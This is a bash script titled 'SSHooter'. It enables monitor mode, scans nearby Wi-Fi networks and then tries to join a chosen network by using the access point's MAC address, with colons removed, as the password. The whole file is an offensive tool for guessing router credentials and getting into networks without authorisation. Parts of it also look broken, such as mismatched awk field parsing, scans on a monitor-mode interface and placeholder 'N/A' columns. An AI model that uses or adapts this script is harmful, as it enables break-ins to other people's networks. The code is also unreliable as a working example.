#!/bin/bash

# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

# Default
DefaultColor='\e[39m'   # Default foreground color

# ASCII Art Tag
echo -e "

${BGreen}███████╗███████╗██╗  ██╗${BBlack} ██████╗  ██████╗ ${BGreen}████████╗███████╗██████╗ 
${BGreen}██╔════╝██╔════╝██║  ██║${BBlack}██╔═══██╗██╔═══██╗${BGreen}╚══██╔══╝██╔════╝██╔══██╗
${BGreen}███████╗███████╗███████║${BBlack}██║   ██║██║   ██║${BGreen}   ██║   █████╗  ██████╔╝
${BGreen}╚════██║╚════██║██╔══██║${BBlack}██║   ██║██║   ██║${BGreen}   ██║   ██╔══╝  ██╔══██╗
${BGreen}███████║███████║██║  ██║${BBlack}╚██████╔╝╚██████╔╝${BGreen}   ██║   ███████╗██║  ██║
${BGreen}╚══════╝╚══════╝╚═╝  ╚═╝${BBlack} ╚═════╝  ╚═════╝ ${BGreen}   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                   
${DefaultColor}
" 

# Function to list available network interfaces
list_network_interfaces() {
    echo "Available network interfaces:"
    # List network interfaces using airmon-ng
    airmon-ng
}

# Function to enable monitor mode on the selected interface
enable_monitor_mode() {
    local interface="$1"
    echo "Enabling monitor mode on interface $interface..."
    airmon-ng start "$interface"
}

# Function to scan Wi-Fi networks
scan_wifi_networks() {
    local interface="$1"
    echo "Scanning for Wi-Fi networks on interface $interface..."
    echo

    # Scan for available networks
    iwlist "$interface" scan | grep 'ESSID\|Address' | awk '
    BEGIN { print "Num  SSID                             BSSID             Port Open  WPS" }
    /ESSID:/ { ssid = substr($0, index($0, ":") + 2); }
    /Address:/ { 
        bssid = $2; 
        num = NR / 2 + 1; 
        printf "%-5d %-30s %-20s %-10s %-10s\n", num, ssid, bssid, "N/A", "N/A"; 
    }'
}

# Function to connect to a Wi-Fi network
connect_to_wifi() {
    local mac_address="$1"

    # Remove colons from MAC address
    local password="${mac_address//:/}"

    # Attempt to connect to the Wi-Fi network using nmcli
    nmcli device wifi connect "$ssid" password "$password" 2>/dev/null

    if [ $? -eq 0 ]; then
        echo "Connected successfully!"
    else
        echo "Failed to connect."
    fi
}

# Main function
main() {
    # List network interfaces and prompt user to choose one
    list_network_interfaces
    read -p "Choose a network interface number: " choice

    # Get the selected interface based on user choice
    local interface=$(airmon-ng | awk 'NR>2 {print $2}' | sed -n "${choice}p")

    # Validate the selected interface
    if [ -z "$interface" ]; then
        echo "Invalid interface selected. Exiting."
        exit 1
    fi

    # Enable monitor mode on the selected interface
    enable_monitor_mode "$interface"

    # Scan for Wi-Fi networks
    scan_wifi_networks "$interface"

    # Prompt user for network choice
    read -p "Choose a network number to connect: " choice
    local selected_network=$(awk -v choice="$choice" 'NR==choice+1 {print $3, $2}' <<< "$(iwlist "$interface" scan | grep 'ESSID\|Address')")
    
    # Extract the SSID and BSSID
    ssid=$(echo "$selected_network" | awk '{print $1}')
    mac_address=$(echo "$selected_network" | awk '{print $2}')

    connect_to_wifi "$mac_address"
}

main